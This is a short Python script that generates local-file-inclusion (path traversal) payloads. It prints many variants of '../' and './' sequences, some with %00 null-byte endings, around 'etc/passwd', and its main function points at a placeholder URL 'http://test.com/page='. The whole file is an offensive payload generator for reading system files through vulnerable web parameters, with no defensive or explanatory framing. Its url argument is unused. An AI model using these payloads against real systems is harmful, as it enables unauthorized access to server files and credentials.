import itertools

def lfi(url, payload, deepth=8):
    dds = "../"
    ds = "./"
    for _ in range(deepth):
        print(f"{dds}{payload}")
        print(f"{payload}{dds}")
        print(f"{payload}/{dds}")
        print(f"{dds}{payload}{dds}")
        print(f"{dds}{payload}/{dds}")
        print(f"{dds}{payload}%00")
        print(f"{payload}{dds}%00")
        print(f"{payload}/{dds}%00")
        print(f"{dds}{payload}{dds}%00")
        print(f"{dds}{payload}/{dds}%00")
        print(f"{ds}{payload}")
        print(f"{payload}{ds}")
        print(f"{payload}/{ds}")
        print(f"{ds}{payload}{ds}")
        print(f"{ds}{payload}/{ds}")
        print(f"{ds}{payload}%00")
        print(f"{payload}{ds}%00")
        print(f"{payload}/{ds}%00")
        print(f"{ds}{payload}{ds}%00")
        print(f"{ds}{payload}/{ds}%00")
        print(f"{dds}{ds}{payload}")
        print(f"{ds}{dds}{payload}")
        dds += dds
        ds += ds
    
    dds = "../"
    for _ in range(deepth):
        ds = "./"
        for _ in range(deepth):
            print(f"{ds}{payload}{dds}")
            print(f"{dds}{payload}{ds}")
            print(f"{ds}{payload}/{dds}")
            print(f"{dds}{payload}/{ds}")
            print(f"{ds}{payload}{dds}%00")
            print(f"{dds}{payload}{ds}%00")
            print(f"{ds}{payload}/{dds}%00")
            print(f"{dds}{payload}/{ds}%00")
            print(f"{dds}{ds}{payload}{ds}")
            print(f"{ds}{dds}{payload}{ds}")
            print(f"{dds}{ds}{payload}{dds}")
            print(f"{ds}{dds}{payload}{dds}")
            print(f"{dds}{ds}{payload}{ds}%00")
            print(f"{ds}{dds}{payload}{ds}%00")
            print(f"{dds}{ds}{payload}{dds}%00")
            print(f"{ds}{dds}{payload}{dds}%00")
            print(f"{dds}{ds}{payload}/{ds}")
            print(f"{ds}{dds}{payload}/{ds}")
            print(f"{dds}{ds}{payload}/{dds}")
            print(f"{ds}{dds}{payload}/{dds}")
            print(f"{dds}{ds}{payload}/{ds}%00")
            print(f"{ds}{dds}{payload}/{ds}%00")
            print(f"{dds}{ds}{payload}/{dds}%00")
            print(f"{ds}{dds}{payload}/{dds}%00")
            ds += ds
        dds += dds
            

def main():          
    lfi("http://test.com/page=", "etc/passwd", 3)



if __name__ == "__main__":
    main()
